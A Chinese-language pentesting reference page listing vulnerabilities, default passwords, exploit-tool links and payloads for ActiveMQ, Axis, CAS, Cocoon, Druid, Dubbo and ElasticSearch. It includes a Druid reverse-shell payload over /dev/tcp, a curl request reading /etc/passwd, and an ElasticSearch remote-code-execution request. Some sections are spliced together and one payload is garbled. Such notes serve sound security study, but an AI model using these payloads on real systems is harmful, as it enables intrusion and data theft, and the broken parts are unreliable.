- [ActiveMQ系列漏洞汇总复现](https://mp.weixin.qq.com/s/5U7v22q2WeLmCnkq7mfr8w)
**搭建教程**
- [ActiveMQ 搭建](../../../Integrated/Linux/Power-Linux.md#ActiveMQ)
**默认密码**
```
admin   admin
```
**CVE-2015-1830 Apache ActiveMQ 5.11.1 Directory Traversal / Shell Upload**
- MSF Module
    ```bash
    use exploit/windows/http/apache_activemq_traversal_upload
    ```
**CVE-2015-5254 ActiveMQ 反序列化漏洞**
- 描述
    Apache ActiveMQ 5.13.0 之前 5.x 版本中存在安全漏洞,该漏洞源于程序没有限制可在代理中序列化的类.远程攻击者可借助特制的序列化的 Java Message Service(JMS)ObjectMessage 对象利用该漏洞执行任意代码.
- 影响版本
    - Apache ActiveMQ 5.0.0 ~ 5.12.1
- 相关文章
    - [ActiveMQ 反序列化漏洞 (CVE-2015-5254) ](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md)
**CVE-2016-3088 ActiveMQ 任意文件写入漏洞**
- 描述
    ActiveMQ 的 web 控制台分三个应用,admin、api 和 fileserver,其中 admin 是管理员页面,api 是接口,fileserver 是储存文件的接口;admin 和 api 都需要登录后才能使用,fileserver 无需登录.
    fileserver 是一个 RESTful API 接口,我们可以通过 GET、PUT、DELETE 等 HTTP 请求对其中存储的文件进行读写操作,其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷,但后来发现:
    - 其使用率并不高
    - 文件操作容易出现漏洞
    所以,ActiveMQ 在 5.12.x~5.13.x 版本中,已经默认关闭了 fileserver 这个应用 (你可以在 conf/jetty.xml 中开启之) ;在 5.14.0 版本以后,彻底删除了 fileserver 应用.
- 影响版本
    - Apache ActiveMQ  官网 : http://axis.apache.org/
Axis 是一个开源的基于 XML 的 Web 服务架构。它包含了 Java 和 C++ 语言实现的 SOAP 服务器，以及各种公用服务及 API 以生成和部署 Web 服务应用。
**相关文章**
- [Apache Axis1 与 Axis2 WebService 的漏洞利用总结](https://paper.seebug.org/1489/#2-apache-axis2)
**Axis-1.4-RCE**
- 相关文章
    - [axis 1.4 AdminService未授权访问 jndi注入利用](https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/axis%201.4%20AdminService%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20jndi%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8/)
- POC | Payload | exp
    - [KibodWapon/Axis-1.4-RCE-Poc](https://github.com/KibodWapon/Axis-1.4-RCE-Poc)
**Axis2默认弱口令**
- 相关文章
    - [【漏洞复现】Axis2默认弱口令后台Getshell](https://mp.weixin.qq.com/s/Gp_FMM-n472wYTBA5lC3lw)
---
### CAS
> 项目地址 : https://github.com/apereo/cas
**Apereo CAS 4.X 反序列化漏洞**
- 相关文章
    - [Apereo CAS 4.X反序列化漏洞分析](https://www.anquanke.com/post/id/198842)
    - [Apereo CAS 4.X反序列化漏洞分析及复现](https://www.freebuf.com/news/226149.html)
    - [Apereo CAS 4.X execution参数反序列化漏洞分析](https://xz.aliyun.com/t/7032)
- 相关工具
    - [21superman/Cas_Exploit](https://github.com/21superman/Cas_Exploit) - CAS反序列化漏洞利用工具
    - [cL0und/cas4.x-execution-rce](https://github.com/cL0und/cas4.x-execution-rce) - exp for 4.1.x-4.1.6, 4.1.7-4.2.x, padding oracle attack
    - [langligelang/CAS_EXP](https://github.com/langligelang/CAS_EXP)
    - [MrMeizhi/ysoserial-mangguogan](https://github.com/MrMeizhi/ysoserial-mangguogan) - ApereoCas反序列化回显与检测
    - [nice0e3/Cas_Exploit](https://github.com/nice0e3/Cas_Exploit)
---
### Cocoon
> 官网 : https://cocoon.apache.org/
**CVE-2020-11991 XML 注入**
- 描述
    程序使用了 StreamGenerator 这个方法时,解析从外部请求的 xml 数据包未做相关的限制,恶意用户就可以构造任意的 xml 表达式,使服务器解析达到 XML 注入的安全问题。
- POC | Payload | exp
    ```xml
    POST /v2/api/product/manger/getInfo
     ]>
    John
    &ent;
    ```
---
### ColdFusion
**CVE-2017-3066 反序列化漏洞**
- POC | Payload | exp
    - https://github.com/vulhub/vulhub/blob/master/coldfusion/CVE-2017-3066/README.zh-cn.md
---
### Druid
#### Alibaba_Druid
**未授权访问**
- 相关文章
    - [Druid未授权（弱口令）的一些利用方式](https://www.cnblogs.com/cwkiller/p/12483223.html)
    - [Druid未授权漏洞实战利用](https://www.t00ls.net/articles-62541.html)
- 相关工具
    - [yuyan-sec/druid_sessions](https://github.com/yuyan-sec/druid_sessions)
#### Apache_Druid
> 官网 : https://druid.apache.org/
> Fofa : title="Apache"&&title="Druid"
Apache Druid 是用 Java 编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。
**CVE-2021-25646**
- 描述
    Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。
- 影响版本
    - Apache Druid &/dev/tcp/xxx/xxx 0>&1')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
    ```
**CVE-2021-26919**
- 相关文章
    - [Apache Druid CVE-2021-26919 漏洞分析](http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
**CVE-2021-36749**
- POC | Payload | exp
    ```
    curl http://127.0.0.1:8888/druid/indexer/v1/sampler?for=connect -H "Content-Type:application/json" -X POST -d "{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"http\",\"uris\":[\" file:///etc/passwd \"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"parser\":{\"type\":\"string\", \"parseSpec\":{\"format\":\"regex\",\"pattern\":\"(.*)\",\"columns\":[\"a\"],\"dimensionsSpec\":{},\"timestampSpec\":{\"column\":\"no_ such_ column\",\"missingValue\":\"2010-01-01T00:00:00Z\"}}}}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}"
    ```
---
### Dubbo
> 官网 : https://dubbo.apache.org/zh-cn/
> fofa: app="APACHE-dubbo"
Apache Dubbo 是一款高性能、轻量级的开源 Java RPC 框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。
**相关工具**
- [threedr3am/dubbo-exp](https://github.com/threedr3am/dubbo-exp) - Dubbo 反序列化一键快速攻击测试工具，支持 dubbo 协议和 http 协议，支持 hessian 反序列化和 java 原生反序列化。
**CVE-2019-17564 pache Dubbo 反序列化漏洞**
- 相关文章
    - [漏洞复现|Dubbo反序列化漏洞CVE-2019-17564](https://www.cnblogs.com/wh4am1/p/12307848.html)
    - [[漏洞分析]CVE-2019-17564/Apache Dubbo存在反序列化漏洞](https://qiita.com/shimizukawasaki/items/39c9695d439768cfaeb5)
    - [Apache Dubbo反序列化漏洞（CVE-2019-17564）](https://mp.weixin.qq.com/s/oBWN0zTBREkvxXGEiaRcGg)
**CVE-2021-30179 Apache Dubbo RCE**
- 相关文章
    - [CVE-2021-30179：Apache Dubbo RCE复现](https://mp.weixin.qq.com/s/68JEDKPIhuOVWh6waTLZ1A)
**CVE-2021-43297**
- 相关文章
    - [Apache Dubbo Hessian2 异常处理时反序列化（CVE-2021-43297）](https://paper.seebug.org/1814/)
---
### ElasticSearch
> 官网 : https://www.elastic.co/
> shodan : port:9200 json
ElasticSearch 是一个基于 Lucene 的搜索服务器.它提供了一个分布式多用户能力的全文搜索引擎,基于 RESTful web 接口.Elasticsearch 是用 Java 开发的,并作为 Apache 许可条款下的开放源码发布,是当前流行的企业级搜索引擎.
**未授权访问漏洞**
- `http://[ip]:9200`
- `http://[ip]:9200/_plugin/head/` web 管理界面
- `http://[ip]:9200/hello/_search?pretty&size=50&from=50`
- `http://[ip]:9200/_cat/indices`
- `http://[ip]:9200/_river/_search` 查看数据库敏感信息
- `http://[ip]:9200/_nodes` 查看节点数据
- `http://[ip]:9200/_cat/indices?v` 查看当前节点的所有 Index
- `http://[ip]:9200/_search?pretty=true` 查询所有的 index, type
- [Elasticvue](https://chrome.google.com/webstore/detail/elasticvue/hkedbapjpblbodpgbajblpnlpenaebaa?hl=en-US) - 进行未授权访问漏洞利用的插件
**CVE-2014-3120 ElasticSearch 命令执行漏洞**
- 描述
    老版本 ElasticSearch 支持传入动态脚本 (MVEL) 来执行一些复杂的操作,而 MVEL 可执行 Java 代码,而且没有沙盒,所以我们可以直接执行任意代码.
- 影响版本
    - ElasticSearch 1.1.1
- POC | Payload | exp
    来源: [ElasticSearch 命令执行漏洞 (CVE-2014-3120) 测试环境](https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/)
    首先,该漏洞需要 es 中至少存在一条数据,所以我们需要先创建一条数据:
    ```
    POST /website/blog/ HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 25
    {
    "name": "test"
    }
    ```
    然后,执行任意代码:
    ```
    POST /_search?pretty HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 343
    {
        "size": 1,
        "query": {
        "filtered": {
            "query": {
            "match_all": {
            }
            }
        }
        },
        "script_fields": {
            "command": {
                "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
            }
        }
    }
    ```
**CVE-2015-1427 Groovy 沙盒绕过 && 代码执行漏洞**